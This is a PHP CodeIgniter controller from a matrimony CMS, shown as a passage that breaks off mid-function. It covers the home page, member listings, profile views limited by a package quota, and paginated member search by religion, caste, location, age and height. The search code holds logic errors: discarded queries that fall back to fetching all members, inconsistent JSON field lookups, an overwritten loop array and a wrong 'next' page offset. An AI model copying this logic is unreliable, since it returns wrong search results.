<?php
defined('BASEPATH') OR exit('No direct script access allowed');
require(APPPATH.'libraries/instamojo/Instamojo.php');

class Home extends CI_Controller {

    /*
     *  Developed by: Active IT zone
     *  Date    : 18 September, 2017
     *  Active Matrimony CMS
     *  http://codecanyon.net/user/activeitezone
     */

    function __construct() {
        parent::__construct();
        $this->load->library('paypal');
        $this->load->library('pum');
        $this->load->library('session');
//        $this->load->helper('url');
        $this->Crud_model->timezone();
        $this->system_name = $this->Crud_model->get_type_name_by_id('general_settings', '1', 'value');
        $this->system_email = $this->Crud_model->get_type_name_by_id('general_settings', '2', 'value');
        $this->system_title = $this->Crud_model->get_type_name_by_id('general_settings', '3', 'value');
        $cache_time  =  $this->db->get_where('general_settings',array('type' => 'cache_time'))->row()->value;

        
        if(!$this->input->is_ajax_request()){
            $this->output->set_header('HTTP/1.0 200 OK');
            $this->output->set_header('HTTP/1.1 200 OK');
            $this->output->set_header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
            $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate');
            $this->output->set_header('Cache-Control: post-check=0, pre-check=0');
            $this->output->set_header('Pragma: no-cache');
            $this->output_cache();
            if($this->router->fetch_method() == 'index' ||
                $this->router->fetch_method() == 'listing' ||
                $this->router->fetch_method() == 'plans' ||
                $this->router->fetch_method() == 'stories' ||
                $this->router->fetch_method() == 'contact_us' ||
                $this->router->fetch_method() == 'faq' ||
                $this->router->fetch_method() == 'terms_and_conditions' ||
                $this->router->fetch_method() == 'privacy_policy' ||
                $this->router->fetch_method() == 'search'){
                $this->output->cache($cache_time);
            }
        }
        setcookie('lang', $this->session->userdata('language'), time() + (86400), "/");
    }

    public function index()
    {
        
        $page_data['title'] = $this->system_title;
        $page_data['top'] = "home.php";
        $page_data['page'] = "home";
        $page_data['bottom'] = "home.php";
        $page_data['all_genders'] = $this->db->get('gender')->result();
        $page_data['all_religions'] = $this->db->get('religion')->result();
        $page_data['all_languages'] = $this->db->get('language')->result();
        $member_approval = $this->db->get_where('general_settings', array('type' => 'member_approval_by_admin'))->row()->value;
        $max_premium_member_num = $this->db->get_where('frontend_settings', array('type' => 'max_premium_member_num'))->row()->value;
        $max_story_num = $this->db->get_where('frontend_settings', array('type' => 'max_story_num'))->row()->value;
        if (!empty($this->session->userdata['member_id']))
        {
            $get_member_gender = $this->db->get_where('member',array('member_id'=>$this->session->userdata['member_id']))->row()->gender;
            if($get_member_gender == '2') {
                $member_gender = '1';
            }
            if($get_member_gender == '1') {
                $member_gender = '2';
            }
            $array_data = array('membership' => 2, 'is_blocked' => 'no','is_closed' => 'no','gender'=>$member_gender);
            $array_data = status($member_approval, $array_data);
            $page_data['premium_members'] = $this->db->order_by('rand()')->get_where('member', $array_data , $max_premium_member_num)->result();
        }
        else
        {
            $array_data = array('membership' => 2, 'is_blocked' => 'no','is_closed' => 'no');
            $array_data = status($member_approval, $array_data);
            $page_data['premium_members'] = $this->db->order_by('rand()')->get_where('member', $array_data , $max_premium_member_num)->result();
        }

        $page_data['happy_stories'] = $this->db->get_where('happy_story', array('approval_status' => 1), $max_story_num)->result();
        $page_data['all_plans'] = $this->db->get("plan")->result();
        $page_data['page_url'] = "";
        $this->load->view('front/index', $page_data);
    }

    function member_permission()
    {
        $login_state = $this->session->userdata('login_state');
        if($login_state == 'yes'){
            $member_id = $this->session->userdata('member_id');
            if ($member_id == NULL) {
                return FALSE;
            }
            else {
                return TRUE;
            }
        } else {
            return FALSE;
        }
    }

    function listing($para1="",$para2="")
    {
        if ($para1=="") {
            $page_data['title'] = "Listing Page || ".$this->system_title;
            $page_data['top'] = "listing.php";
            $page_data['page'] = "listing";
            $page_data['bottom'] = "listing.php";
            $page_data['nav_dropdown'] = "all_members";
            $page_data['home_search'] = "false";

            $page_data['home_gender'] = "";
            $page_data['home_religion'] = "";
            $page_data['home_caste'] = "";
            $page_data['home_sub_caste'] = "";
            $page_data['home_language'] = "";
            $page_data['min_height'] = "";
            $page_data['max_height'] = "";
            $page_data['search_member_type'] = "all";
            $page_data['page_url'] = "home/listing";
            recache();
            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="home_search") {
            $page_data['title'] = "Listing Page || ".$this->system_title;
            $page_data['top'] = "listing.php";
            $page_data['page'] = "listing";
            $page_data['bottom'] = "listing.php";
            $page_data['nav_dropdown'] = "";
            $page_data['home_search'] = "true";

            $page_data['home_gender'] = $this->input->post('gender');
            $page_data['aged_from'] = $this->input->post('aged_from');
            $page_data['aged_to'] = $this->input->post('aged_to');
            $page_data['home_religion'] = $this->input->post('religion');
            $page_data['home_caste'] = $this->input->post('caste');
            $page_data['home_sub_caste'] = $this->input->post('sub_caste');
            $page_data['home_language'] = $this->input->post('language');
            $page_data['min_height'] = $this->input->post('min_height');
            $page_data['max_height'] = $this->input->post('max_height');
            $page_data['search_member_type'] = "all";
            recache();
            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="premium_members") {
            $page_data['title'] = "Premium Members || ".$this->system_title;
            $page_data['top'] = "listing.php";
            $page_data['page'] = "listing";
            $page_data['bottom'] = "listing.php";
            $page_data['member_type'] = "premium_members";
            $page_data['nav_dropdown'] = "premium_members";
            $page_data['home_search'] = "false";

            $page_data['home_gender'] = "";
            $page_data['home_religion'] = "";
            $page_data['home_caste'] = "";
            $page_data['home_sub_caste'] = "";
            $page_data['home_language'] = "";
            $page_data['min_height'] = "";
            $page_data['max_height'] = "";
            $page_data['search_member_type'] = "all";
            $page_data['page_url'] = "home/listing/premium_members";
            recache();
            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="free_members") {
            $page_data['title'] = "Free Members || ".$this->system_title;
            $page_data['top'] = "listing.php";
            $page_data['page'] = "listing";
            $page_data['bottom'] = "listing.php";
            $page_data['member_type'] = "free_members";
            $page_data['nav_dropdown'] = "free_members";
            $page_data['home_search'] = "false";
            $page_data['home_gender'] = "";
            $page_data['home_religion'] = "";
            $page_data['home_caste'] = "";
            $page_data['home_sub_caste'] = "";
            $page_data['home_language'] = "";
            $page_data['min_height'] = "";
            $page_data['max_height'] = "";
            $page_data['search_member_type'] = "all";
            $page_data['page_url'] = "home/listing/free_members";
            recache();
            $this->load->view('front/index', $page_data);
        }
    }

    function member_profile($para1="",$para2="")
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        if ($para1 != "" || $para1 != NULL) {
            $is_valid = $this->db->get_where("member", array("member_id" => $para1))->row()->member_id;
            if (!$is_valid) {
                redirect(base_url().'home', 'refresh');
            }
            if ($this->db->get_where("member", array("member_id" => $para1))->row()->is_closed == 'yes') {
                redirect(base_url().'home', 'refresh');
            }
            $member_id = $this->session->userdata('member_id');
            $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
            $ignored_ids = json_decode($ignored_ids, true);

            if (!in_array($para1, $ignored_ids) && $para1 != $member_id) {
                $member = $this->db->get_where("member", array("member_id" => $this->session->userdata('member_id')))->result();
                $pkInfo = json_decode($member[0]->package_info,true);
                $rmCount = $pkInfo[0]['view_count'] - count($this->db->get_where("member_profile_view",array("member_id" => $this->session->userdata('member_id')))->result());
                $this->session->set_userdata(array('view_profile' => $rmCount));
                if ($rmCount == 0)
                {
                    redirect($this->agent->referrer());
                    return;                    
                }
                $data = array("member_id" => $this->session->userdata('member_id'),"view_id" => $para1);
                $this->db->insert('member_profile_view', $data);
                $page_data['title'] = "Member Profile || ".$this->system_title;
                $page_data['top'] = "profile.php";
                $page_data['page'] = "member_profile";
                $page_data['bottom'] = "profile.php";
                $page_data['get_member'] = $this->db->get_where("member", array("member_id" => $para1))->result();

                $this->load->view('front/index', $page_data);
            }
            else {
                redirect(base_url().'home/listing', 'refresh');
            }
        } else {
            redirect(base_url().'home/listing', 'refresh');
        }

    }

    function ajax_member_list($para1="",$para2="")
    {
        $this->load->library('Ajax_pagination');
        $member_approval = $this->db->get_where('general_settings', array('type' => 'member_approval_by_admin'))->row()->value;
        if (!empty($this->session->userdata['member_id']))
        {
            $get_member_gender = $this->db->get_where('member',array('member_id'=>$this->session->userdata['member_id']))->row()->gender;
            if($get_member_gender == '2') {
                $member_gender = '1';
            }
            if($get_member_gender == '1') {
                $member_gender = '2';
            }
        }
        //$this->db->like('basic_info','"age":"30"','both');
        $config_base_url = base_url().'home/ajax_member_list/';
        if ($para2 == "free_members") {
            if ($this->member_permission() == FALSE) {
                $array_data = array('membership' => 1, 'is_blocked' => 'no', 'email_verification_status'=> 1);
                $array_data = status($member_approval, $array_data);
                $config['total_rows'] = $this->db->get_where('member', $array_data)->num_rows();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('membership' => 1, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no' , 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data )->num_rows();
                }
                else {
                    $array_data = array('membership' => 1, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data)->num_rows();
                }
            }
        }
        elseif ($para2 == "premium_members") {
            if ($this->member_permission() == FALSE) {
                $array_data = array('membership' => 2, 'is_blocked' => 'no','is_closed' => 'no' , 'email_verification_status'=> 1);
                $array_data = status($member_approval, $array_data);
                $config['total_rows'] = $this->db->get_where('member', $array_data)->num_rows();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('membership' => 2, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no' , 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data)->num_rows();
                }
                else {
                    $array_data = array('membership' => 2, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no' , 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data )->num_rows();
                }
            }
        }
        elseif ($para2 == "search") {
            $config_base_url = base_url().'home/ajax_member_list/search/';
            $all_result = array();
            if ($this->member_permission() == FALSE) {
                $cond = array('is_blocked' =>'no','is_closed' =>'no', 'email_verification_status'=> 1);
                $cond = status($member_approval, $cond);
                $all_id = $this->db->select('member_id')->where($cond)->get('member')->result();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $all_id = $this->db->select('member_id')->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member',$array_data )->result();
                    //$this->db->last_query($all_id);
                }
                else {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $all_id = $this->db->select('member_id')->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data)->result();
                }
            }
            foreach ($all_id as $row) {
                $all_result[] = $row->member_id;
            }
            
            $gender   = $this->input->post('gender');
            $member_profile_id   = $this->input->post('member_id');
            $marital_status = $this->input->post('marital_status');
            $religion = $this->input->post('religion');
            $caste    = $this->input->post('caste');
            $sub_caste= $this->input->post('sub_caste');
            $language = $this->input->post('language');
            $country  = $this->input->post('country');
            $state    = $this->input->post('state');
            $city     = $this->input->post('city');
            $profession  = $this->input->post('profession');

            $aged_from = $this->input->post('aged_from') - 1;
            if (!empty($aged_from)) {
                $from_year = date('Y') - $aged_from;
                $from_date = $from_year."-01-01";
                $sql_aged_from = strtotime($from_date);
            }

            $aged_to = $this->input->post('aged_to');
            if (!empty($aged_to)) {
                $to_year = date('Y') - $aged_to;
                $to_date = $to_year."-01-01";
                $sql_aged_to = strtotime($to_date);
            }

            $min_height = $this->input->post('min_height');
            $max_height = $this->input->post('max_height');
            $search_member_type = $this->input->post('search_member_type');

            $by_gender = array();
            $by_member_profile_id = array();
            $by_marital_status = array();
            $by_religion = array();
            $by_caste = array();
            $by_sub_caste = array();
            $by_language = array();
            $by_country = array();
            $by_state = array();
            $by_city = array();
            $by_profession = array();
            $by_age = array();
            $by_height = array();

            $all_array = array();

            if (isset($gender) && $gender != "") {
                $array_data = array('gender' => $gender);
                $array_data = status($member_approval, $array_data);
                $by_genders = $this->db->select('member_id')->get_where('member', $array_data)->result();
                foreach ($by_genders as $by_genders) {
                    $by_gender[] = $by_genders->member_id;
                }
            } else {
                $by_gender = $all_result;
            }
            

            if (isset($member_profile_id) && $member_profile_id != "") {
                $array_data = array('member_profile_id' => $member_profile_id);
                $array_data = status($member_approval, $array_data);
                $by_member_profile_ids = $this->db->select('member_id')->get_where('member', $array_data)->result();
                foreach ($by_member_profile_ids as $by_member_profile_ids) {
                    $by_member_profile_id[] = $by_member_profile_ids->member_id;
                }
            } else {
                $by_member_profile_id = $all_result;
            }

            if (isset($profession) && $profession != "") {
                $this->db->select('member_id')->like('education_and_career','"occupation":"'.$profession.'"','both')->get('member')->result();
                $by_professions = $this->db->get('member')->result();
                foreach ($by_professions as $by_professions) {
                    $by_profession[] = $by_professions->member_id;
                }
            } else {
                $by_profession = $all_result;
            }

            if (isset($marital_status) && $marital_status != "") {
                $this->db->select('member_id')->like('basic_info','"marital_status":"'.$marital_status.'"','both')->get('member')->result();
                $by_marital_statuss = $this->db->get('member')->result();
                foreach ($by_marital_statuss as $by_marital_statuss) {
                    $by_marital_status[] = $by_marital_statuss->member_id;
                }
            } else {
                $by_marital_status = $all_result;
            }

            if (isset($religion) && $religion != "") {
                
                $array_data = array('religion' => $religion);
                $by_religions = $this->db->select('member_id')->like('basic_info','"religion":"'.$religion.'"','both')->get('member')->result();
                foreach ($by_religions as $by_religions) {
                    $by_religion[] = $by_religions->member_id;
                }
            } else {
                $by_religion = $all_result;
            }
            
            if (isset($caste) && $caste != "") {
                
                $array_data = array('caste' => $caste);
                $by_castes = $this->db->select('member_id')->like('basic_info','"caste":"'.$caste.'"','both')->get('member')->result();;
                foreach ($by_castes as $by_castes) {
                    $by_caste[] = $by_castes->member_id;
                }
            } else {
                $by_caste = $all_result;
            }
            
            
            if (isset($sub_caste) && $sub_caste != "") {
                $by_sub_caste = $this->db->select('member_id')->like('present_address','"sub_caste":"'.$sub_caste.'"','both')->get('member')->result();
                foreach ($by_sub_caste as $by_sub_caste) {
                    $by_sub_caste[] = $by_sub_caste->member_id;
                }
            } else {
                $by_sub_caste = $all_result;
            }
            
            if (isset($language) && $language != "") {
                $array_data = array('mother_tounge' => $language);
                $by_languages = $this->db->select('member_id')->get_where('member', array('mother_tounge' => $language))->result();
                foreach ($by_languages as $by_languages) {
                    $by_language[] = $by_languages->member_id;
                }
            } else {
                $by_language = $all_result;
            }

            if (isset($country) && $country != "") {
                $by_countries = $this->db->select('member_id')->like('present_address','"country":"'.$country.'"','both')->get('member')->result();
                foreach ($by_countries as $by_countries) {
                    $by_country[] = $by_countries->member_id;
                }
            } else {
                $by_country = $all_result;
            }

            if (isset($state) && $state != "") {
                $by_states = $this->db->select('member_id')->like('present_address','"state":"'.$state.'"','both')->get('member')->result();
                foreach ($by_states as $by_states) {
                    $by_state[] = $by_states->member_id;
                }
            } else {
                $by_state = $all_result;
            }

            if (isset($city) && $city != "") {
                $by_cities = $this->db->select('member_id')->like('present_address','"city":"'.$city.'"','both')->get('member')->result();
                foreach ($by_cities as $by_cities) {
                    $by_city[] = $by_cities->member_id;
                }
            } else {
                $by_city = $all_result;
            }

            if (isset($sql_aged_from) && isset($sql_aged_to)) {
                $by_ages = $this->db->select('member_id')->get_where('member',array('date_of_birth <=' => $sql_aged_from, 'date_of_birth >=' => $sql_aged_to))->result();
                foreach ($by_ages as $by_ages) {
                    $by_age[] = $by_ages->member_id;
                }
            } else {
                $by_age = $all_result;
            }
            
            if (isset($min_height) && isset($max_height)) {
                $by_heights = $this->db->select('member_id')->get_where('member',array('height >=' => $min_height, 'height <=' => $max_height))->result();
                foreach ($by_heights as $by_heights) {
                    $by_height[] = $by_heights->member_id;
                }
            } else {
                $by_height = $all_result;
            }

            if (isset($search_member_type)) {
                if ($search_member_type == "free_members") {
                    $by_members_type = $this->db->select('member_id')->get_where('member',array('membership' => 1))->result();
                }
                elseif ($search_member_type == "premium_members") {
                    $by_members_type = $this->db->select('member_id')->get_where('member',array('membership' => 2))->result();
                }
                elseif ($search_member_type == "all") {
                    $by_members_type = $all_id;
                }
                foreach ($by_members_type as $by_members_type) {
                    $by_member_type[] = $by_members_type->member_id;
                }
            } else {
                $by_height = $all_result;
            }
            $all_array = array_intersect($by_gender,$by_member_profile_id,$by_marital_status,$by_profession,$by_religion,$by_caste,$by_sub_caste,$by_language,$by_country,$by_state,$by_city,$by_age,$by_height);
            // print_r($all_array);
            $config['total_rows'] = count($all_array);
        }
        elseif ($para2 == "") {
            if ($this->member_permission() == FALSE) {
                $cond = array('is_blocked' =>'no','is_closed' =>'no', 'email_verification_status'=> 1);
                $cond = status($member_approval, $cond);
                $config['total_rows'] = $this->db->where($cond)->count_all_results('member');
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data)->num_rows();
                }
                else {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->where('gender', $member_gender);
                    $config['total_rows'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data)->num_rows();
                }

            }
        }

        // pagination
        $config['base_url'] = $config_base_url;
        $config['per_page'] = 5;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;
        if ($para2 == "search") {
            $function = "filter_members('0', 'search')";
        } else {
            $function = "filter_members('0')";
        }
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];

        $last_start = floor($rr) * $config['per_page'];
        if ($para2 == "search") {
            $function = "filter_members('" . $last_start . "', 'search')";
        } else {
            $function = "filter_members('" . $last_start . "')";
        }
        //$function = "filter_members('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        if ($para2 == "search") {
            $function = "filter_members('" . ($para1 - $config['per_page']) . "', 'search')";
        } else {
            $function = "filter_members('" . ($para1 - $config['per_page']) . "')";
        }
        //$function = "filter_members('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        if ($para2 == "search") {
            $function = "filter_members('" . ($para1 - $config['per_page']) . "', 'search')";
        } else {
            $function = "filter_members('" . ($para1 + $config['per_page']) . "')";
        }
        // $function = "filter_members('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        if ($para2 == "search") {
            $function = "filter_members(((this.innerHTML-1)*" . $config['per_page'] . "), 'search')";
        } else {
            $function = "filter_members(((this.innerHTML-1)*" . $config['per_page'] . "))";
        }
        // $function = "filter_members(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        
        $this->ajax_pagination->initialize($config);

        //$this->db->like('basic_info','"age":"30"','both');

        if ($para2 == "free_members") {
            if ($this->member_permission() == FALSE) {

                $array_data = array('membership' => 1, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                $array_data = status($member_approval, $array_data);
                $this->db->order_by('member_id','desc');
                $page_data['get_all_members'] = $this->db->get_where('member',$array_data , $config['per_page'], $para1)->result();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('membership' => 1, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data, $config['per_page'], $para1)->result();
                }
                else {
                    $array_data = array('membership' => 1, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data , $config['per_page'], $para1)->result();
                }
            }
        }
        elseif ($para2 == "premium_members") {
            if ($this->member_permission() == FALSE) {
                $array_data = array('membership' => 2, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                $array_data = status($member_approval, $array_data);
                $this->db->order_by('member_id','desc');
                $page_data['get_all_members'] = $this->db->get_where('member',$array_data , $config['per_page'], $para1)->result();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('membership' => 2, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data , $config['per_page'], $para1)->result();
                }
                else {
                    $array_data = array('membership' => 2, 'member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $page_data['get_all_members'] = $this->db->where_not_in('member_id', $ignored_by_ids)->get_where('member', $array_data , $config['per_page'], $para1)->result();
                }
            }
        }
        elseif ($para2 == "search") {
            $all_result = array();
            if ($this->member_permission() == FALSE) {
                $cond = array('is_blocked' =>'no','is_closed' =>'no', 'email_verification_status'=> 1);
                $cond = status($member_approval, $cond);
                $this->db->order_by('member_id','desc');
                $all_id = $this->db->select('member_id')->where($cond)->get('member')->result();
            }
            elseif ($this->member_permission() == TRUE) {
                $member_id = $this->session->userdata('member_id');
                //For Ignored Members
                $ignored_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored');
                $ignored_ids = json_decode($ignored_ids, true);
                $ignored_by_ids = $this->Crud_model->get_type_name_by_id('member', $member_id, 'ignored_by');
                $ignored_by_ids = json_decode($ignored_by_ids, true);
                if (empty($ignored_by_ids)) {
                    array_push($ignored_by_ids, 0);
                }
                if (!empty($ignored_ids)) {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $all_id = $this->db->select('member_id')->where_not_in('member_id', $ignored_ids)->where_not_in('member_id', $ignored_by_ids)->get_where('member',$array_data )->result();
                }
                else {
                    $array_data = array('member_id !=' => $member_id, 'is_blocked' => 'no','is_closed' => 'no', 'email_verification_status'=> 1);
                    $array_data = status($member_approval, $array_data);
                    $this->db->order_by('member_id','desc');
                    $this->db->where('gender', $member_gender);
                    $all_id = $this->db->select('member_id')->where_not_in('member_id', $ignored_by_ids)->get_where('member',$array_data )->result();
                }

            }
            foreach ($all_id as $row) {
                $all_result[] = $row->member_id;
            }

            if (isset($gender) && $gender != "") {
                $array_data = array('gender' => $gender);
                $array_data = status($member_approval, $array_data);
                $this->db->order_by('member_id','desc');
                $by_genders = $this->db->select('member_id')->get_where('member', $array_data)->result();
                foreach ($by_genders as $by_genders) {
                    $by_gender[] = $by_genders->member_id;
                }
            } else {
                $by_gender = $all_result;
            }

            if (isset($member_profile_id) && $member_profile_id != "") {
                $array_data = array('member_profile_id' => $member_profile_id);
                $array_data = status($member_approval, $array_data);
                $this->db->order_by('member_id','desc');
                $by_member_profile_ids = $this->db->select('member_id')->get_where('member', $array_data)->result();
                foreach ($by_member_profile_ids as $by_member_profile_ids) {
                    $by_member_profile_id[] = $by_member_profile_ids->member_id;
                }
            } else {
                $by_member_profile_id = $all_result;
            }

            if (isset($marital_status) && $marital_status != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('education_and_career','"marital_status":"'.$marital_status.'"','both');
                $by_marital_statuss = $this->db->get('member')->result();
                foreach ($by_marital_statuss as $by_marital_statuss) {
                    $by_marital_status[] = $by_marital_statuss->member_id;
                }
            } else {
                $by_marital_status = $all_result;
            }

            if (isset($profession) && $profession != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('basic_info','"occupation":"'.$profession.'"','both');
                $by_professions = $this->db->get('member')->result();
                foreach ($by_professions as $by_professions) {
                    $by_profession[] = $by_professions->member_id;
                }
            } else {
                $by_profession = $all_result;
            }

            if (isset($religion) && $religion != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('spiritual_and_social_background','"religion":"'.$religion.'"','both');
                $by_religions = $this->db->get('member')->result();
                foreach ($by_religions as $by_religions) {
                    $by_religion[] = $by_religions->member_id;
                }
            } else {
                $by_religion = $all_result;
            }

            if (isset($caste) && $caste != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('spiritual_and_social_background','"caste":"'.$caste.'"','both');
                $by_castes = $this->db->get('member')->result();
                foreach ($by_castes as $by_castes) {
                    $by_caste[] = $by_castes->member_id;
                }
            } else {
                $by_caste = $all_result;
            }
            if (isset($sub_caste) && $sub_caste != "") {
                $this->db->order_by('member_id','desc');
                $this->db->select('member_id')->like('spiritual_and_social_background','"sub_caste":"'.$sub_caste.'"','both');
                $by_sub_castes = $this->db->get('member')->result();
